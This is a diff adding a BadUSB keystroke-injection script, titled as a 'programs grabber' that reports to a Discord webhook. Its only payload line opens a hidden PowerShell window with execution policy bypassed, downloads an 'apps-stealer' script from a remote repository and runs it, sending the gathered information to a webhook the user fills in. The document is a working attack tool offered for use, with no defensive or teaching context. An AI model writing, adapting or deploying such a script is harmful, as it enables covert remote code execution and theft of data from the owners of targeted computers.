@@ -1,0 +1,7 @@
+REM Programs grabber to discord webhook
+REM by SuperJakov
+REM switch 'WEBHOOK_HERE' with your webhook
+GUI r 
+DELAY 500
+STRING powershell -NoP -w h -ep bypass  $dc='WEBHOOK_HERE';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/apps-stealer/apps-stealer.ps1 | iex
+ENTER
